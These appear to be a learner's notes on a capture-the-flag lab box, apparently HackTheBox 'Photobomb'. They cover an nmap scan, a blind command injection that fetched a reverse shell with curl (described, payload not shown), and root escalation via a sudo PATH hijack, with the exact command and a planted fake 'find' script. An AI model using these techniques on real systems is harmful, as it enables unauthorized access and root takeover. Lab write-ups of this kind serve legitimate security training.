#setenv #blind-os-command-injection
```shell
nmap -sC -sV -oN scan.txt 10.129.228.60 -T5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-09 04:55 CST
Nmap scan report for 10.129.228.60
Host is up (0.0019s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Found a link on a js file that contains credentials of a webpage
![[Pasted image 20250210101841.png]]

# download function was vulnerable to blind shell injection, tried multiple payload, like using base64 encoded shell, then running it on bash, doesn't work
# The payload that works was a curl command that downloads a reverse shell binary then executed it on bash 
![[Pasted image 20250210101933.png]]

# the user has sudo privilege that can modify env variable while running /opt/cleanup,sh, I added an executable that will invoke a reverse shell on /dev/shm as 'find' 

```shell
sudo PATH=/dev/shm:$PATH /opt/cleanup.sh


```

```shell
#!/bin/bash

bash 
```


# the other way to exploit it is thru adding an executable named [

# the second line on the /opt/cleanup.sh triggers the 'enable -n [ # ]' command which enables executing a file with a name '[' ']'

# same thing, I added a file named '[' on /dev/shm then executed the bash file

# inside the cleanup.sh was an if statement that uses square braces that triggers the privesc
